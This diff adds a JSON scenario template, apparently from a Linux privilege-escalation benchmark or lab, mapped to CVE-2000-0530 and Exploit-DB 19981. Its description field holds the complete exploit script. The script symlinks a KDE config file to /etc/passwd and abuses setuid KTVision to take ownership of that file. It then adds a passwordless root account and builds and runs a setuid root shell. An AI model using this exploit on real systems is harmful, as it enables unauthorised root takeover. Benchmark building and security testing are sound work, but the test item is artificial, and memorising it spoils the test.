@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_19981",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: KDE 1.1.2 KApplication configfile - Local Privilege Escalation (3) (CVE-2000-0530;OSVDB-1372)\n\nExploit source code (19981.sh):\n```\n#source: https://www.securityfocus.com/bid/1291/info\n#\n#The KDE configuration-file management has a bug which could result in root compromise.\n#\n#Due to insecure creation of configuration (rc) files via KApplication-class, local users can modify ownership of arbitrary files when running setuid root KDE-programs.\n#\n#Properly exploited, this can permit a local attacker to change ownership of key system files, then write arbitrary data to them, allowing an elevation of privileges.\n\n\n#!/bin/bash\n\nlink=/home/paul/.kde/share/config\nlinkto=/etc/passwd\ntarget=/opt/kde/bin/ktvision\n\necho \"\"\necho \"KTVision <= 0.1.1-271 local r00t exploit by IhaQueR\"\necho \"\"\n\nif ! test -u $target ; then\n        echo \"[-] $target not found\"\n        exit 1\nfi;\n\necho \"[+] $target found\"\n\nrm -f sush*\ncat <<__DUPA__>>sush.c\n#include <stdio.h>\nmain()\n{\n        setuid(geteuid());\n        setgid(getegid());\n        execl(\"/bin/bash\", \"/bin/bash\", NULL);\n}\n__DUPA__\n\necho \"    compiling sush\"\nres=$(gcc sush.c -o sush)\n\nif test \"$res\" != \"\" -o ! -x sush ; then\n        echo \"[-] failed\"\n        rm sush* ktvback.*\n        exit 2;\nfi;\n\necho \"[+] success\"\n\ncp $linkto ktvback.$$\nmkdir -p $link\nrm -f $link/ktvisionrc\nln -s $linkto $link/ktvisionrc\n\necho \"\"\necho -n \"now running... (ensure that X is up and running)\"\n\n$target >/dev/null 2>&1 &\ncpid=$!\n\ndeclare -i cnt\ndeclare -i max\ncnt=0\nmax=60\n\nwhile ! test -O $linkto ; do\n        sleep 1;\n        printf \"  %.2d\" $cnt\n        cnt=$(($cnt+1))\n        if test $cnt -ge $max ; then\n                echo \"\"\n                echo \"\"\n                echo \"[-] FAILED\"\n                rm sush* ktvback.*\n                exit 2;\n        fi;\ndone;\n\nkill -9 $cpid >/dev/null 2>&1\nrm $link/ktvisionrc\n\necho \"\"\necho \"\"\necho \"[+] SUCCESS, creating sush\"\necho >>$linkto \"r00t::0:0:root:/root:/bin/bash\"\necho \"\"\nsu r00t -c \"chown 0.0 sush; chmod u+s sush; chmod g+s sush; cp\nktvback.$$ $linkto; chown 0.0 $linkto\"\nrm ktvback.* sush.c\n\nif ! test -u sush ; then\n        echo \"    hm strange error\"\n        rm sush* ktvback.*\n        exit 1\nfi;\n\necho \"\"\necho \"starting ./sush\"\n./sush\n\n#!plonk\n```",
+  "cve": "CVE-2000-0530;OSVDB-1372",
+  "exploitdb_id": "19981",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_19981",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
